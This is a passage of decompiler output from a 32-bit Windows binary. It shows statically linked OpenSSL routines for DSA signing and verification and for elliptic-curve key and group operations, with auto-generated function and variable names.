              || sub_428A00((_DWORD **)(a1 + 32), *(LPCRITICAL_SECTION *)(a1 + 52), *(int ***)(a1 + 8), v8) )
            {
              if ( sub_4220E0(v9, (int)v9, *(_DWORD *)(a1 + 12)) )
              {
                v11 = sub_416F90(v9);
                if ( v11 > sub_416F90(*(_DWORD **)(a1 + 12)) || sub_4220E0(v9, (int)v9, *(_DWORD *)(a1 + 12)) )
                {
                  v12 = *(int (__cdecl **)(int, unsigned int *, _DWORD, _DWORD *, _DWORD, int *, _DWORD))(*(_DWORD *)(a1 + 44) + 20);
                  if ( v12
                     ? v12(a1, v17, *(_DWORD *)(a1 + 16), v9, *(_DWORD *)(a1 + 8), v8, *(_DWORD *)(a1 + 32))
                     : sub_427DE0(a2, v17, *(int **)(a1 + 16), v9, *(_DWORD *)(a1 + 8), v8, *(void **)(a1 + 32)) )
                  {
                    if ( sub_4299A0(0, (int)v17, v17, *(int **)(a1 + 12), v8) )
                    {
                      v14 = sub_4211F0(0, v9, *(int **)(a1 + 12), v8);
                      if ( v14 )
                      {
                        sub_417000(*a4);
                        *a4 = v14;
                        v15 = 1;
                        goto LABEL_25;
                      }
                    }
                  }
                }
              }
            }
            break;
          }
        }
      }
    }
    sub_408310(10, 107, 3, (int)"crypto\\dsa\\dsa_ossl.c", 216);
    v15 = 0;
LABEL_25:
    if ( v8 != Block )
      sub_4206C0((void **)v8);
    sub_417000(v9);
    return v15;
  }
  else
  {
    sub_408310(10, 107, 101, (int)"crypto\\dsa\\dsa_ossl.c", 142);
    return 0;
  }
}

//----- (004353D0) --------------------------------------------------------
int __usercall sub_4353D0@<eax>(__m64 a1@<mm0>, _BYTE *a2, int a3, _DWORD *a4, int a5)
{
  int v5; // esi
  bool v6; // zf
  int v7; // eax
  int *v9; // ebx
  void **v10; // ebp
  int *v11; // eax
  int *v12; // edi
  int v13; // ecx
  _DWORD *v14; // eax
  int v15; // esi
  int (__cdecl *v16)(int, unsigned int *, _DWORD, int *, _DWORD, void **, _DWORD, int *, _DWORD *); // ecx
  int v17; // eax
  unsigned int *Block; // [esp+8h] [ebp-10h]
  _DWORD *v19; // [esp+Ch] [ebp-Ch] BYREF
  int v20; // [esp+10h] [ebp-8h]
  _DWORD *v21; // [esp+14h] [ebp-4h]

  v5 = a5;
  v6 = *(_DWORD *)(a5 + 8) == 0;
  v21 = 0;
  if ( !v6 && *(_DWORD *)(a5 + 12) && *(_DWORD *)(a5 + 16) )
  {
    v7 = sub_416F90(*(_DWORD **)(a5 + 12));
    v20 = v7;
    if ( v7 != 160 && v7 != 224 && v7 != 256 )
    {
      sub_408310(10, 113, 102, (int)"crypto\\dsa\\dsa_ossl.c", 239);
      return -1;
    }
    if ( sub_416F90(*(_DWORD **)(v5 + 8)) > 10000 )
    {
      sub_408310(10, 113, 103, (int)"crypto\\dsa\\dsa_ossl.c", 244);
      return -1;
    }
    v9 = sub_4168C0();
    v10 = (void **)sub_4168C0();
    Block = sub_4168C0();
    v11 = sub_420670();
    v12 = v11;
    if ( !v9 || !v10 || !Block || !v11 )
      goto LABEL_28;
    sub_434E20(a4, &a5, &v19);
    if ( sub_416DB0(a5)
      || sub_416E40(a5)
      || sub_416960((_DWORD *)a5, *(int **)(v5 + 12)) >= 0
      || sub_416DB0((int)v19)
      || sub_416E40((int)v19)
      || sub_416960(v19, *(int **)(v5 + 12)) >= 0 )
    {
      v15 = 0;
      goto LABEL_29;
    }
    if ( !sub_4211F0(v10, v19, *(int **)(v5 + 12), v12) )
      goto LABEL_28;
    v13 = a3;
    if ( a3 > v20 >> 3 )
      v13 = v20 >> 3;
    if ( !sub_4174D0(a2, v13, (int)v9)
      || !sub_42A430(v9, v9, (unsigned int **)v10, *(int **)(v5 + 12), v12)
      || !sub_42A430(v10, (int *)a5, (unsigned int **)v10, *(int **)(v5 + 12), v12) )
    {
      goto LABEL_28;
    }
    if ( (*(_BYTE *)(v5 + 28) & 1) != 0 )
    {
      v14 = sub_428A00((_DWORD **)(v5 + 32), *(LPCRITICAL_SECTION *)(v5 + 52), *(int ***)(v5 + 8), v12);
      if ( !v14 )
        goto LABEL_28;
    }
    else
    {
      v14 = v21;
    }
    v16 = *(int (__cdecl **)(int, unsigned int *, _DWORD, int *, _DWORD, void **, _DWORD, int *, _DWORD *))(*(_DWORD *)(v5 + 44) + 16);
    if ( v16 )
      v17 = v16(v5, Block, *(_DWORD *)(v5 + 16), v9, *(_DWORD *)(v5 + 20), v10, *(_DWORD *)(v5 + 8), v12, v14);
    else
      v17 = sub_456090(a1, Block, *(int **)(v5 + 16), v9, *(int **)(v5 + 20), v10, *(int ***)(v5 + 8), v12, v14);
    if ( v17 && sub_4299A0(0, (int)v9, Block, *(int **)(v5 + 12), v12) )
    {
      v15 = sub_416960(v9, (int *)a5) == 0;
      goto LABEL_29;
    }
LABEL_28:
    v15 = -1;
    sub_408310(10, 113, 3, (int)"crypto\\dsa\\dsa_ossl.c", 320);
LABEL_29:
    sub_4206C0((void **)v12);
    sub_417060((void **)v9);
    sub_417060(v10);
    sub_417060((void **)Block);
    return v15;
  }
  sub_408310(10, 113, 101, (int)"crypto\\dsa\\dsa_ossl.c", 232);
  return -1;
}

//----- (004356F0) --------------------------------------------------------
int *__usercall sub_4356F0@<eax>(__m64 a1@<mm0>, _BYTE *a2, int Size, int a4)
{
  int *v4; // ebp
  int *v5; // esi
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int v8; // ebx
  void *v10; // [esp+10h] [ebp-10h] BYREF
  void *Block; // [esp+14h] [ebp-Ch]
  void *v12; // [esp+18h] [ebp-8h]
  int v13; // [esp+1Ch] [ebp-4h]

  v10 = 0;
  v4 = 0;
  v13 = 3;
  v5 = 0;
  Block = sub_4168C0();
  v6 = sub_4168C0();
  v12 = v6;
  if ( Block && v6 )
  {
    if ( *(_DWORD *)(a4 + 8) && *(_DWORD *)(a4 + 12) && *(_DWORD *)(a4 + 16) )
    {
      v5 = (int *)sub_41DB20();
      if ( v5 )
      {
        *v5 = (int)sub_4168C0();
        v7 = sub_4168C0();
        v5[1] = (int)v7;
        if ( *v5 )
        {
          if ( v7 )
          {
            v4 = sub_420670();
            if ( v4 )
            {
              v8 = Size;
              while ( sub_4351D0(a4, a1, v4, (void ***)&v10, (unsigned int **)v5, a2, v8) )
              {
                if ( v8 > (sub_416F90(*(_DWORD **)(a4 + 12)) + 7) / 8 )
                  v8 = (sub_416F90(*(_DWORD **)(a4 + 12)) + 7) / 8;
                if ( !sub_4174D0(a2, v8, (int)Block)
                  || !sub_42A430(v12, *(int **)(a4 + 24), (unsigned int **)*v5, *(int **)(a4 + 12), v4)
                  || !sub_4220E0((_DWORD *)v5[1], (int)v12, (int)Block)
                  || sub_4169B0((_DWORD *)v5[1], *(_DWORD **)(a4 + 12)) > 0
                  && !sub_422020((_DWORD *)v5[1], v5[1], *(_DWORD *)(a4 + 12))
                  || !sub_42A430((_DWORD *)v5[1], (int *)v5[1], (unsigned int **)v10, *(int **)(a4 + 12), v4) )
                {
                  break;
                }
                if ( !sub_416DB0(*v5) && !sub_416DB0(v5[1]) )
                  goto LABEL_25;
              }
            }
          }
        }
      }
    }
    else
    {
      v13 = 101;
    }
  }
  sub_408310(10, 112, v13, (int)"crypto\\dsa\\dsa_ossl.c", 116);
  sub_41DB60((_DWORD **)v5);
  v5 = 0;
LABEL_25:
  sub_4206C0((void **)v4);
  sub_417000(Block);
  sub_417000(v12);
  sub_417000(v10);
  return v5;
}

//----- (00435930) --------------------------------------------------------
int __usercall sub_435930@<eax>(__m64 a1@<mm0>, int a2, int *Block, void ***a4, unsigned int **a5)
{
  return sub_4351D0(a2, a1, Block, a4, a5, 0, 0);
}

//----- (00435950) --------------------------------------------------------
int sub_435950()
{
  return sub_42AE00(&stru_539098);
}

//----- (00435960) --------------------------------------------------------
int __cdecl sub_435960(_DWORD *a1)
{
  if ( a1[3] )
    return sub_42AC30((int *)&stru_539098, (int)sub_435950, a1, &dword_506A08, 1, 0);
  else
    return 1;
}
// 506A08: using guessed type int dword_506A08;

//----- (00435990) --------------------------------------------------------
int __cdecl sub_435990(_DWORD *a1)
{
  if ( a1[3] )
    return sub_42AC30((int *)&stru_539098, (int)sub_435950, a1, &dword_506A08, 1, 1);
  else
    return 1;
}
// 506A08: using guessed type int dword_506A08;

//----- (004359C0) --------------------------------------------------------
_DWORD *sub_4359C0()
{
  return sub_42AE50((int *)&stru_539098, 1);
}

//----- (004359D0) --------------------------------------------------------
int __cdecl sub_4359D0(int a1, int a2, int a3)
{
  return (*(int (**)(void))(*(_DWORD *)(a3 + 44) + 4))();
}

//----- (004359E0) --------------------------------------------------------
int __cdecl sub_4359E0(int a1, int a2, int a3, int a4)
{
  return (*(int (**)(void))(*(_DWORD *)(a4 + 44) + 12))();
}

//----- (004359F0) --------------------------------------------------------
char **sub_4359F0()
{
  return &off_506A24;
}
// 506A24: using guessed type char *off_506A24;

//----- (00435A00) --------------------------------------------------------
int __cdecl sub_435A00(_DWORD *a1)
{
  _DWORD *v1; // eax
  int v2; // esi
  struct _RTL_CRITICAL_SECTION *v4; // eax
  int v5; // eax
  int (__cdecl *v6)(int); // eax

  v1 = sub_413430(0x30u);
  v2 = (int)v1;
  if ( !v1 )
  {
    sub_408310(16, 245, 65, (int)"crypto\\ec\\ec_kmeth.c", 78);
    return 0;
  }
  v1[8] = 1;
  v4 = sub_414650();
  *(_DWORD *)(v2 + 44) = v4;
  if ( !v4 )
  {
    sub_408310(16, 245, 65, (int)"crypto\\ec\\ec_kmeth.c", 85);
    sub_413490((void *)v2);
    return 0;
  }
  *(char **)v2 = off_5313F4[0];
  if ( a1 )
  {
    if ( !sub_416200(a1) )
    {
      sub_408310(16, 245, 38, (int)"crypto\\ec\\ec_kmeth.c", 94);
LABEL_17:
      sub_41DE70((volatile LONG *)v2);
      return 0;
    }
    *(_DWORD *)(v2 + 4) = a1;
  }
  else
  {
    *(_DWORD *)(v2 + 4) = sub_457680();
  }
  if ( *(_DWORD *)(v2 + 4) )
  {
    v5 = sub_457690(*(_DWORD *)(v2 + 4));
    *(_DWORD *)v2 = v5;
    if ( !v5 )
    {
      sub_408310(16, 245, 38, (int)"crypto\\ec\\ec_kmeth.c", 103);
      goto LABEL_17;
    }
  }
  *(_DWORD *)(v2 + 8) = 1;
  *(_DWORD *)(v2 + 28) = 4;
  if ( !sub_414B00(8u, v2, (int **)(v2 + 40)) )
    goto LABEL_17;
  v6 = *(int (__cdecl **)(int))(*(_DWORD *)v2 + 8);
  if ( v6 && !v6(v2) )
  {
    sub_408310(16, 245, 70, (int)"crypto\\ec\\ec_kmeth.c", 117);
    goto LABEL_17;
  }
  return v2;
}
// 5313F4: using guessed type char *off_5313F4[2];

//----- (00435B30) --------------------------------------------------------
size_t __cdecl sub_435B30(void *a1, size_t Size, int a3, int *a4, void (__cdecl *a5)(void *, int *, void *, size_t *))
{
  int v5; // eax
  int (__cdecl *v6)(void **, int **, int, int *); // eax
  int v8; // esi
  size_t v9; // eax
  void *Src; // [esp+0h] [ebp-4h] BYREF

  v5 = *a4;
  Src = 0;
  v6 = *(int (__cdecl **)(void **, int **, int, int *))(v5 + 36);
  if ( !v6 )
  {
    sub_408310(16, 246, 152, (int)"crypto\\ec\\ec_kmeth.c", 135);
    return 0;
  }
  if ( Size <= 0x7FFFFFFF )
  {
    if ( !v6(&Src, &a4, a3, a4) )
      return 0;
    if ( a5 )
    {
      a5(Src, a4, a1, &Size);
      v8 = (int)a4;
    }
    else
    {
      v9 = Size;
      v8 = (int)a4;
      if ( Size > (unsigned int)a4 )
      {
        v9 = (size_t)a4;
        Size = (size_t)a4;
      }
      memcpy(a1, Src, v9);
    }
    sub_4134B0(Src, v8);
    return Size;
  }
  else
  {
    sub_408310(16, 246, 161, (int)"crypto\\ec\\ec_kmeth.c", 139);
    return 0;
  }
}

//----- (00435C30) --------------------------------------------------------
_DWORD *__cdecl sub_435C30(int a1)
{
  _DWORD *v2; // eax
  _DWORD *v3; // esi
  _DWORD *v4; // eax
  _DWORD *v5; // eax

  if ( a1 )
  {
    if ( *(_DWORD *)(a1 + 8) )
    {
      v2 = sub_413430(0x64u);
      v3 = v2;
      if ( v2 )
      {
        *v2 = a1;
        if ( ((*(_BYTE *)a1 & 2) != 0 || (v4 = sub_4168C0(), (v3[2] = v4) != 0)
                                      && (v5 = sub_4168C0(), (v3[3] = v5) != 0))
          && (v3[5] = 1, v3[6] = 4, (*(int (__cdecl **)(_DWORD *))(a1 + 8))(v3)) )
        {
          return v3;
        }
        else
        {
          sub_417060((void **)v3[2]);
          sub_417060((void **)v3[3]);
          sub_413490(v3);
          return 0;
        }
      }
      else
      {
        sub_408310(16, 108, 65, (int)"crypto\\ec\\ec_lib.c", 40);
        return 0;
      }
    }
    else
    {
      sub_408310(16, 108, 66, (int)"crypto\\ec\\ec_lib.c", 34);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 108, 108, (int)"crypto\\ec\\ec_lib.c", 30);
    return 0;
  }
}

//----- (00435D10) --------------------------------------------------------
void __cdecl sub_435D10(int a1)
{
  if ( *(_DWORD *)(a1 + 92) == 5 )
    sub_457760(*(volatile LONG **)(a1 + 96));
  *(_DWORD *)(a1 + 96) = 0;
}

//----- (00435D30) --------------------------------------------------------
int __cdecl sub_435D30(int a1)
{
  return *(_DWORD *)a1;
}

//----- (00435D40) --------------------------------------------------------
int __cdecl sub_435D40(int a1)
{
  if ( !*(_DWORD *)(*(_DWORD *)a1 + 36) )
    sub_417C70("assertion failed: group->meth->group_order_bits != NULL", "crypto\\ec\\ec_lib.c", 328);
  return (*(int (__cdecl **)(int))(*(_DWORD *)a1 + 36))(a1);
}

//----- (00435D80) --------------------------------------------------------
BOOL __cdecl sub_435D80(int a1, _DWORD *a2)
{
  return *(_DWORD *)(a1 + 12) && sub_4173E0(a2, *(_DWORD **)(a1 + 12)) && !sub_416DB0(*(_DWORD *)(a1 + 12));
}

//----- (00435DC0) --------------------------------------------------------
int __cdecl sub_435DC0(int a1, int a2)
{
  int result; // eax

  result = a2;
  *(_DWORD *)(a1 + 16) = a2;
  return result;
}

//----- (00435DD0) --------------------------------------------------------
int __cdecl sub_435DD0(int a1)
{
  return *(_DWORD *)(a1 + 24);
}

//----- (00435DE0) --------------------------------------------------------
int __cdecl sub_435DE0(int a1, void *Src, size_t Size)
{
  int result; // eax

  sub_413490(*(void **)(a1 + 28));
  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  if ( !Size || !Src )
    return 1;
  result = (int)sub_4133F0(Size);
  *(_DWORD *)(a1 + 28) = result;
  if ( result )
  {
    memcpy((void *)result, Src, Size);
    *(_DWORD *)(a1 + 32) = Size;
    return Size;
  }
  return result;
}

//----- (00435E60) --------------------------------------------------------
int __cdecl sub_435E60(int a1)
{
  int (*v1)(void); // eax

  v1 = *(int (**)(void))(*(_DWORD *)a1 + 24);
  if ( v1 )
    return v1();
  sub_408310(16, 109, 66, (int)"crypto\\ec\\ec_lib.c", 412);
  return 0;
}

//----- (00435E90) --------------------------------------------------------
int __cdecl sub_435E90(int a1)
{
  int (*v1)(void); // eax

  v1 = *(int (**)(void))(*(_DWORD *)a1 + 28);
  if ( v1 )
    return v1();
  sub_408310(16, 130, 66, (int)"crypto\\ec\\ec_lib.c", 422);
  return 0;
}

//----- (00435ED0) --------------------------------------------------------
int __cdecl sub_435ED0(int a1)
{
  int (*v1)(void); // eax

  v1 = *(int (**)(void))(*(_DWORD *)a1 + 24);
  if ( v1 )
    return v1();
  sub_408310(16, 176, 66, (int)"crypto\\ec\\ec_lib.c", 434);
  return 0;
}

//----- (00435F10) --------------------------------------------------------
int __cdecl sub_435F10(int a1)
{
  int (*v1)(void); // eax

  v1 = *(int (**)(void))(*(_DWORD *)a1 + 28);
  if ( v1 )
    return v1();
  sub_408310(16, 172, 66, (int)"crypto\\ec\\ec_lib.c", 445);
  return 0;
}

//----- (00435F50) --------------------------------------------------------
int __cdecl sub_435F50(int a1)
{
  int (*v1)(void); // eax

  v1 = *(int (**)(void))(*(_DWORD *)a1 + 32);
  if ( v1 )
    return v1();
  sub_408310(16, 173, 66, (int)"crypto\\ec\\ec_lib.c", 455);
  return 0;
}

//----- (00435F90) --------------------------------------------------------
_DWORD *__cdecl sub_435F90(int *a1)
{
  _DWORD *v2; // esi
  int v3; // eax

  if ( a1 )
  {
    if ( *(_DWORD *)(*a1 + 44) )
    {
      v2 = sub_413430(0x14u);
      if ( v2 )
      {
        v3 = *a1;
        *v2 = *a1;
        if ( (*(int (__cdecl **)(_DWORD *))(v3 + 44))(v2) )
        {
          return v2;
        }
        else
        {
          sub_413490(v2);
          return 0;
        }
      }
      else
      {
        sub_408310(16, 121, 65, (int)"crypto\\ec\\ec_lib.c", 561);
        return 0;
      }
    }
    else
    {
      sub_408310(16, 121, 66, (int)"crypto\\ec\\ec_lib.c", 555);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 121, 67, (int)"crypto\\ec\\ec_lib.c", 551);
    return 0;
  }
}

//----- (00436040) --------------------------------------------------------
void __cdecl sub_436040(void *Block)
{
  void (__cdecl *v1)(void *); // eax

  if ( Block )
  {
    v1 = *(void (__cdecl **)(void *))(*(_DWORD *)Block + 48);
    if ( v1 )
      v1(Block);
    sub_413490(Block);
  }
}

//----- (00436070) --------------------------------------------------------
void __cdecl sub_436070(_BYTE *Block)
{
  void (__cdecl *v1)(_BYTE *); // ecx
  void (__cdecl *v2)(_BYTE *); // eax

  if ( Block )
  {
    v1 = *(void (__cdecl **)(_BYTE *))(*(_DWORD *)Block + 52);
    if ( v1 )
    {
      v1(Block);
    }
    else
    {
      v2 = *(void (__cdecl **)(_BYTE *))(*(_DWORD *)Block + 48);
      if ( v2 )
        v2(Block);
    }
    sub_4134B0(Block, 20);
  }
}

//----- (004360B0) --------------------------------------------------------
int __cdecl sub_4360B0(_DWORD *a1, _DWORD *a2)
{
  int (__cdecl *v2)(_DWORD *, _DWORD *); // esi

  v2 = *(int (__cdecl **)(_DWORD *, _DWORD *))(*a1 + 56);
  if ( v2 )
  {
    if ( *a1 == *a2 )
    {
      if ( a1 == a2 )
        return 1;
      else
        return v2(a1, a2);
    }
    else
    {
      sub_408310(16, 114, 101, (int)"crypto\\ec\\ec_lib.c", 604);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 114, 66, (int)"crypto\\ec\\ec_lib.c", 600);
    return 0;
  }
}

//----- (00436120) --------------------------------------------------------
int __cdecl sub_436120(int a1, _DWORD *a2)
{
  int (__cdecl *v2)(int, _DWORD *); // ecx

  v2 = *(int (__cdecl **)(int, _DWORD *))(*(_DWORD *)a1 + 60);
  if ( v2 )
  {
    if ( *(_DWORD *)a1 == *a2 )
    {
      return v2(a1, a2);
    }
    else
    {
      sub_408310(16, 127, 101, (int)"crypto\\ec\\ec_lib.c", 644);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 127, 66, (int)"crypto\\ec\\ec_lib.c", 640);
    return 0;
  }
}

//----- (00436180) --------------------------------------------------------
int __cdecl sub_436180(int a1, _DWORD *a2, int a3, int a4, int a5, int a6)
{
  int (__cdecl *v6)(int, _DWORD *, int, int, int, int); // ecx

  v6 = *(int (__cdecl **)(int, _DWORD *, int, int, int, int))(*(_DWORD *)a1 + 64);
  if ( v6 )
  {
    if ( *(_DWORD *)a1 == *a2 )
    {
      return v6(a1, a2, a3, a4, a5, a6);
    }
    else
    {
      sub_408310(16, 126, 101, (int)"crypto\\ec\\ec_lib.c", 662);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 126, 66, (int)"crypto\\ec\\ec_lib.c", 657);
    return 0;
  }
}

//----- (004361F0) --------------------------------------------------------
int __cdecl sub_4361F0(int a1, _DWORD *a2, int a3, int a4, int a5)
{
  int (__cdecl *v5)(int, _DWORD *, int, int, int); // ecx

  v5 = *(int (__cdecl **)(int, _DWORD *, int, int, int))(*(_DWORD *)a1 + 76);
  if ( v5 )
  {
    if ( *(_DWORD *)a1 == *a2 )
    {
      return v5(a1, a2, a3, a4, a5);
    }
    else
    {
      sub_408310(16, 116, 101, (int)"crypto\\ec\\ec_lib.c", 751);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 116, 66, (int)"crypto\\ec\\ec_lib.c", 746);
    return 0;
  }
}

//----- (00436260) --------------------------------------------------------
int __cdecl sub_436260(int a1, _DWORD *a2, int a3, int a4, int a5)
{
  int (__cdecl *v5)(int, _DWORD *, int, int, int); // ecx

  v5 = *(int (__cdecl **)(int, _DWORD *, int, int, int))(*(_DWORD *)a1 + 76);
  if ( v5 )
  {
    if ( *(_DWORD *)a1 == *a2 )
    {
      return v5(a1, a2, a3, a4, a5);
    }
    else
    {
      sub_408310(16, 183, 101, (int)"crypto\\ec\\ec_lib.c", 769);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 183, 66, (int)"crypto\\ec\\ec_lib.c", 764);
    return 0;
  }
}

//----- (004362D0) --------------------------------------------------------
int __cdecl sub_4362D0(int a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, int a5)
{
  int (__cdecl *v5)(int, _DWORD *, _DWORD *, _DWORD *, int); // esi

  v5 = *(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int))(*(_DWORD *)a1 + 92);
  if ( v5 )
  {
    if ( *(_DWORD *)a1 == *a2 && *a2 == *a3 && *a3 == *a4 )
    {
      return v5(a1, a2, a3, a4, a5);
    }
    else
    {
      sub_408310(16, 112, 101, (int)"crypto\\ec\\ec_lib.c", 785);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 112, 66, (int)"crypto\\ec\\ec_lib.c", 780);
    return 0;
  }
}

//----- (00436350) --------------------------------------------------------
int __cdecl sub_436350(int a1, _DWORD *a2, _DWORD *a3, int a4)
{
  int (__cdecl *v4)(int, _DWORD *, _DWORD *, int); // edx

  v4 = *(int (__cdecl **)(int, _DWORD *, _DWORD *, int))(*(_DWORD *)a1 + 96);
  if ( v4 )
  {
    if ( *(_DWORD *)a1 == *a2 && *a2 == *a3 )
    {
      return v4(a1, a2, a3, a4);
    }
    else
    {
      sub_408310(16, 115, 101, (int)"crypto\\ec\\ec_lib.c", 799);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 115, 66, (int)"crypto\\ec\\ec_lib.c", 795);
    return 0;
  }
}

//----- (004363C0) --------------------------------------------------------
int __cdecl sub_4363C0(int a1, _DWORD *a2, int a3)
{
  int (__cdecl *v3)(int, _DWORD *, int); // ecx

  v3 = *(int (__cdecl **)(int, _DWORD *, int))(*(_DWORD *)a1 + 100);
  if ( v3 )
  {
    if ( *(_DWORD *)a1 == *a2 )
    {
      return v3(a1, a2, a3);
    }
    else
    {
      sub_408310(16, 210, 101, (int)"crypto\\ec\\ec_lib.c", 812);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 210, 66, (int)"crypto\\ec\\ec_lib.c", 808);
    return 0;
  }
}

//----- (00436430) --------------------------------------------------------
int __cdecl sub_436430(int a1, _DWORD *a2)
{
  int (__cdecl *v2)(int, _DWORD *); // ecx

  v2 = *(int (__cdecl **)(int, _DWORD *))(*(_DWORD *)a1 + 104);
  if ( v2 )
  {
    if ( *(_DWORD *)a1 == *a2 )
    {
      return v2(a1, a2);
    }
    else
    {
      sub_408310(16, 118, 101, (int)"crypto\\ec\\ec_lib.c", 826);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 118, 66, (int)"crypto\\ec\\ec_lib.c", 822);
    return 0;
  }
}

//----- (00436490) --------------------------------------------------------
int __cdecl sub_436490(int a1, _DWORD *a2, int a3)
{
  int (__cdecl *v3)(int, _DWORD *, int); // ecx

  v3 = *(int (__cdecl **)(int, _DWORD *, int))(*(_DWORD *)a1 + 108);
  if ( v3 )
  {
    if ( *(_DWORD *)a1 == *a2 )
    {
      return v3(a1, a2, a3);
    }
    else
    {
      sub_408310(16, 119, 101, (int)"crypto\\ec\\ec_lib.c", 847);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 119, 66, (int)"crypto\\ec\\ec_lib.c", 843);
    return 0;
  }
}

//----- (004364F0) --------------------------------------------------------
int __cdecl sub_4364F0(int a1, _DWORD *a2, _DWORD *a3, int a4)
{
  int (__cdecl *v4)(int, _DWORD *, _DWORD *, int); // edx

  v4 = *(int (__cdecl **)(int, _DWORD *, _DWORD *, int))(*(_DWORD *)a1 + 112);
  if ( v4 )
  {
    if ( *(_DWORD *)a1 == *a2 && *a2 == *a3 )
    {
      return v4(a1, a2, a3, a4);
    }
    else
    {
      sub_408310(16, 113, 101, (int)"crypto\\ec\\ec_lib.c", 861);
      return -1;
    }
  }
  else
  {
    sub_408310(16, 113, 66, (int)"crypto\\ec\\ec_lib.c", 857);
    return -1;
  }
}

//----- (00436560) --------------------------------------------------------
int __cdecl sub_436560(int a1, _DWORD *a2, int a3)
{
  int (__cdecl *v3)(int, _DWORD *, int); // ecx

  v3 = *(int (__cdecl **)(int, _DWORD *, int))(*(_DWORD *)a1 + 116);
  if ( v3 )
  {
    if ( *(_DWORD *)a1 == *a2 )
    {
      return v3(a1, a2, a3);
    }
    else
    {
      sub_408310(16, 120, 101, (int)"crypto\\ec\\ec_lib.c", 874);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 120, 66, (int)"crypto\\ec\\ec_lib.c", 870);
    return 0;
  }
}

//----- (004365C0) --------------------------------------------------------
int __cdecl sub_4365C0(int a1, unsigned int a2, int a3, int a4)
{
  int (__cdecl *v4)(int, unsigned int, int, int); // edi
  int v6; // eax

  v4 = *(int (__cdecl **)(int, unsigned int, int, int))(*(_DWORD *)a1 + 120);
  if ( v4 )
  {
    v6 = 0;
    if ( a2 )
    {
      while ( *(_DWORD *)a1 == **(_DWORD **)(a3 + 4 * v6) )
      {
        if ( ++v6 >= a2 )
          return v4(a1, a2, a3, a4);
      }
      sub_408310(16, 136, 101, (int)"crypto\\ec\\ec_lib.c", 891);
      return 0;
    }
    else
    {
      return v4(a1, a2, a3, a4);
    }
  }
  else
  {
    sub_408310(16, 136, 66, (int)"crypto\\ec\\ec_lib.c", 886);
    return 0;
  }
}

//----- (00436650) --------------------------------------------------------
int __cdecl sub_436650(int *a1, _DWORD *a2, _DWORD *a3, int a4, int a5, int a6)
{
  BOOL v6; // edx
  int (__cdecl *v7)(int *, _DWORD *, _DWORD *, BOOL, int *, int *, int); // ecx
  int v9; // [esp+0h] [ebp-4h] BYREF

  v9 = a4;
  a4 = a5;
  v6 = v9 && a5;
  v7 = *(int (__cdecl **)(int *, _DWORD *, _DWORD *, BOOL, int *, int *, int))(*a1 + 124);
  if ( v7 )
    return v7(a1, a2, a3, v6, &v9, &a4, a6);
  else
    return sub_4577E0(a1, a2, a3, v6, (int)&v9, (int)&a4, a6);
}

//----- (004366D0) --------------------------------------------------------
int __cdecl sub_4366D0(int a1)
{
  int (*v2)(void); // eax

  if ( !*(_DWORD *)(*(_DWORD *)a1 + 124) )
    return sub_4585F0(a1);
  v2 = *(int (**)(void))(*(_DWORD *)a1 + 132);
  if ( v2 )
    return v2();
  else
    return 0;
}

//----- (00436700) --------------------------------------------------------
int __cdecl sub_436700(int a1)
{
  void **v1; // edi
  int v2; // ebx
  _DWORD *v3; // eax

  v1 = (void **)sub_420670();
  v2 = 0;
  sub_4285A0(*(_DWORD **)(a1 + 88));
  *(_DWORD *)(a1 + 88) = 0;
  if ( v1 )
  {
    v3 = sub_4289A0();
    *(_DWORD *)(a1 + 88) = v3;
    if ( v3 )
    {
      if ( !sub_4285F0(v3, *(int ***)(a1 + 8), (int *)v1) )
      {
        sub_4285A0(*(_DWORD **)(a1 + 88));
        *(_DWORD *)(a1 + 88) = 0;
        sub_4206C0(v1);
        return 0;
      }
      v2 = 1;
    }
  }
  sub_4206C0(v1);
  return v2;
}

//----- (00436780) --------------------------------------------------------
int __cdecl sub_436780(int a1)
{
  int result; // eax

  result = *(_DWORD *)(a1 + 8);
  if ( result )
    return sub_416F90(*(_DWORD **)(a1 + 8));
  return result;
}

//----- (004367A0) --------------------------------------------------------
void __cdecl sub_4367A0(volatile LONG **Block)
{
  void (__cdecl *v1)(volatile LONG **); // eax
  volatile LONG *v2; // edx
  volatile LONG *v3; // edi
  void (__cdecl *v4)(volatile LONG *); // eax

  if ( Block )
  {
    v1 = (void (__cdecl *)(volatile LONG **))*((_DWORD *)*Block + 3);
    if ( v1 )
      v1(Block);
    if ( Block[23] == (volatile LONG *)5 )
      sub_457760(Block[24]);
    v2 = Block[22];
    Block[24] = 0;
    sub_4285A0(v2);
    v3 = Block[1];
    if ( v3 )
    {
      v4 = *(void (__cdecl **)(volatile LONG *))(*v3 + 48);
      if ( v4 )
        v4(Block[1]);
      sub_413490((void *)v3);
    }
    sub_417060((void **)Block[2]);
    sub_417060((void **)Block[3]);
    sub_413490((void *)Block[7]);
    sub_413490(Block);
  }
}

//----- (00436840) --------------------------------------------------------
void __cdecl sub_436840(volatile LONG **Block)
{
  void (__cdecl *v1)(volatile LONG **); // ecx
  void (__cdecl *v2)(volatile LONG **); // eax
  volatile LONG *v3; // ecx
  volatile LONG *v4; // edi
  void (__cdecl *v5)(volatile LONG *); // ecx
  void (__cdecl *v6)(volatile LONG *); // eax

  if ( Block )
  {
    v1 = (void (__cdecl *)(volatile LONG **))*((_DWORD *)*Block + 4);
    if ( v1 )
    {
      v1(Block);
    }
    else
    {
      v2 = (void (__cdecl *)(volatile LONG **))*((_DWORD *)*Block + 3);
      if ( v2 )
        v2(Block);
    }
    if ( Block[23] == (volatile LONG *)5 )
      sub_457760(Block[24]);
    v3 = Block[22];
    Block[24] = 0;
    sub_4285A0(v3);
    v4 = Block[1];
    if ( v4 )
    {
      v5 = *(void (__cdecl **)(volatile LONG *))(*v4 + 52);
